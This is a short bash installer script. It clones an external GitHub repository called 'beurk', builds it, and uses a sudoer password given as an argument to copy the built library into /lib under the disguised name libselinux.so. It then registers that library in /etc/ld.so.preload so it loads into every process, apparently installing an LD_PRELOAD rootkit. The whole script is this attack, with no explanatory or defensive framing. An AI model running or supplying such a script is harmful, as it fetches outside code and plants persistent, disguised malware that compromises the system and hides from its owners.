#!/bin/bash
# NOTE: first argument is password of sudoer
git clone https://github.com/unix-thrust/beurk.git
cd beurk
make
echo $1 | sudo -S cp libselinux.so /lib/
echo $1 | sudo -S sh -c 'echo /lib/libselinux.so >> /etc/ld.so.preload'
exit
